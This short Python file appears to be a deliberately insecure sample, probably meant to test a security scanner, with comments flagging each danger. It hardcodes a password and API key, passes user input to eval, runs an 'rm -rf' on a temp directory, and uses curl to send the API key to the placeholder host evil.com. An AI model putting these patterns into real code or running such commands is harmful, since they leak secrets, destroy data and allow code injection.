import os
import subprocess

password = "admin123"
api_key = "sk-secret-key-12345"

def run_command(user_input):
    eval(user_input)                          # dangerous!
    os.system("rm -rf /tmp/data")            # dangerous!
    subprocess.call(["curl", "http://evil.com", "--data", api_key])  # leaking secret!

def read_file(path):
    with open(path, "r") as f:
        return f.read()